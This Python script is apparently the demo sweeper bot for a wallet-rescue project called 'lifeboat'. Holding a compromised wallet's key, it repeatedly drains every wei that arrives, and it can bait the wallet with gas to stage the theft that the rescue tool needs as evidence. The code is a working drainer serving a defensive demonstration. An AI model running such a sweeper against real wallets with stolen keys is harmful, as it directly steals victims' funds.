"""The demo's sweeper bot: it holds the victim's key and takes every wei that reaches the wallet.

Usage: python demo/sweeper.py [--rpc URL] [--bait N] [--seconds S]

With --bait N the deployer sends the victim a little gas N times first, the way an owner would when
trying to move the assets by hand, and the bot takes it each time. That is the whole problem
lifeboat exists for, and it is also the on-chain record lifeboat asks for before it agrees to run.
Without --seconds the bot runs until it is stopped.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

from web3 import Web3

sys.path.insert(0, str(Path(__file__).resolve().parent))

from common import DEFAULT_RPC, accounts, load_env, send  # noqa: E402

BAIT = 5 * 10**14
TIP = 10**6


def sweep_once(w3: Web3, victim, dest: str) -> int:
    """Send the victim's whole native balance, minus the fee, to `dest`. Returns what was taken."""
    balance = w3.eth.get_balance(victim.address)
    max_fee = int(w3.eth.get_block("latest")["baseFeePerGas"]) * 2 + TIP
    cost = 21_000 * max_fee * 2  # twice the fee: an OP Stack chain charges a data fee on top
    if balance <= cost:
        return 0
    send(w3, victim, {"to": dest, "value": balance - cost, "gas": 21_000,
                      "maxFeePerGas": max_fee, "maxPriorityFeePerGas": TIP})
    return balance - cost


def run(w3: Web3, who: dict, bait: int = 0, seconds: float | None = None, interval: float = 0.5,
        log=print) -> int:
    """Sweep until `seconds` have passed (forever when None). Returns the total taken."""
    victim, dest = who["victim"], who["sweeper"].address
    taken = sweep_once(w3, victim, dest)
    for n in range(bait):
        send(w3, who["deployer"], {"to": victim.address, "value": BAIT, "gas": 21_000})
        log(f"gas sent to the wallet ({n + 1} of {bait}): {BAIT} wei")
        got = 0
        while got == 0:
            got = sweep_once(w3, victim, dest)
            if got == 0:
                time.sleep(interval)
        log(f"  swept: {got} wei gone to {dest}")
        taken += got
    deadline = None if seconds is None else time.time() + seconds
    while deadline is None or time.time() < deadline:
        got = sweep_once(w3, victim, dest)
        if got:
            log(f"swept: {got} wei gone to {dest}")
            taken += got
        time.sleep(interval)
    return taken


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--rpc", default=DEFAULT_RPC)
    parser.add_argument("--bait", type=int, default=0, help="times to send gas to the wallet and watch it go")
    parser.add_argument("--seconds", type=float, default=None, help="stop after this long")
    args = parser.parse_args()
    w3 = Web3(Web3.HTTPProvider(args.rpc, request_kwargs={"timeout": 30}))
    who = accounts(load_env())
    print(f"sweeper watching {who['victim'].address} on chain {w3.eth.chain_id}; Ctrl+C stops it")
    try:
        total = run(w3, who, args.bait, args.seconds)
    except KeyboardInterrupt:
        return 0
    print(f"total taken: {total} wei")
    return 0


if __name__ == "__main__":
    sys.exit(main())
